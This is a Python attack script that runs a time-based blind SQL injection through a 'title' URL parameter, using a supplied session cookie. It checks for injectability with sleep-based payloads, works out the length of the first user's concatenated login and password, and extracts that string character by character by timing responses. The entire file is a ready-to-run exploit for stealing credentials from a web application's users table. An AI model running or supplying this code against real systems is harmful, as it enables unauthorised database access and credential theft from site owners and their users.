import requests
import time
import sys

def binarySearch(URL, index, cookie):
    low = 32
    high = 126
    while low <= high:
        mid = (high + low) // 2
        if mid == low:
            return chr(mid)
        url = URL + f"?title=' OR (if((select ascii(substring(concat(login,'-',password),{index},1)) from users LIMIT 1)<{mid},sleep(1),1))-- -'"
        start_time = time.time()
        requests.get(url=url, headers={"Cookie": cookie})
        finish_time = time.time()
        request_time = finish_time - start_time
        if request_time >= 2:
            high = mid
        else:
            low = mid

def extractData(URL, length, cookie):
    data = ""
    for index in range(1, length + 1):
        data += binarySearch(URL, index, cookie)
        print(data)
    print(data)

def findlength(URL, cookie):
    low = 1
    high = 200
    while low <= high:
        mid = (high + low) // 2
        if mid == low:
            return mid
        url = URL + f"?title=' OR (if((select length(concat(login,'-',password)) from users LIMIT 1)<{mid},sleep(1),1))-- -'"
        start_time = time.time()
        requests.get(url=url, headers={"Cookie": cookie})
        finish_time = time.time()
        request_time = finish_time - start_time
        if request_time >= 2:
            high = mid
        else:
            low = mid

def detectSQLi(URL, cookie):
    url = URL + "?title=' OR (if(sysdate()=now(),sleep(2),1))-- -'"
    start_time = time.time()
    response = requests.get(url=url, headers={"Cookie": cookie})
    finish_time = time.time()
    request_time = finish_time - start_time
    return request_time >= 2

def main():
    if len(sys.argv) != 3:
        print("Usage: python script.py <URL> <Cookie>")
        sys.exit(1)
    
    URL = sys.argv[1]
    cookie = sys.argv[2]
    
    if detectSQLi(URL, cookie):
        print("SQLi detected, trying to exploit...")
        length = findlength(URL, cookie)
        print("Length: {}".format(length))
        extractData(URL, length, cookie)
    else:
        print("SQLi not detected.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(1)
